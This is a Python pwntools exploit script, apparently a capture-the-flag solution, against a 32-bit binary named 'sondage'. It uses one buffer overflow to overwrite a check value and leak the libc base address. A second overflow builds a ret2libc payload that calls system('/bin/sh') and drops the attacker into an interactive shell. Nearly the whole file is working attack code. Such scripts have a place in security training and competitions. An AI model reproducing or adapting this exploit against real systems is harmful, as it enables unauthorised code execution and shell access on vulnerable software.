#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './sondage'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *verification
'''.format(**locals())

context.log_level = "debug"
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def get_leak(leak):
    for l in leak.split("\n"):
        if "libc.so.6" in l:
            return l.split("-")[0]

io = start()

padding = 32
payload1 = flat(
    "A"*padding,
    0x13371337
)

io.sendlineafter(b':',payload1)
leak = io.recvuntil(b"?",timeout=1).decode()
print(get_leak(leak))
libc_addr = int(get_leak(leak),16)
#libc_addr = 0xf7d8a000
print(f"LIBC => {hex(libc_addr)}")

padding_2 = 44

system = libc_addr + 0x0004f8f0
binsh = libc_addr + 0x1bcde8

payload_2 = flat(
    padding_2*"A",
    system,
    0x1bcdf0,
    binsh
)
'''
payload_2 = flat(
    padding_2*"A",
    0x0804931e
)'''

io.sendline(payload_2)
#print(leak)
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

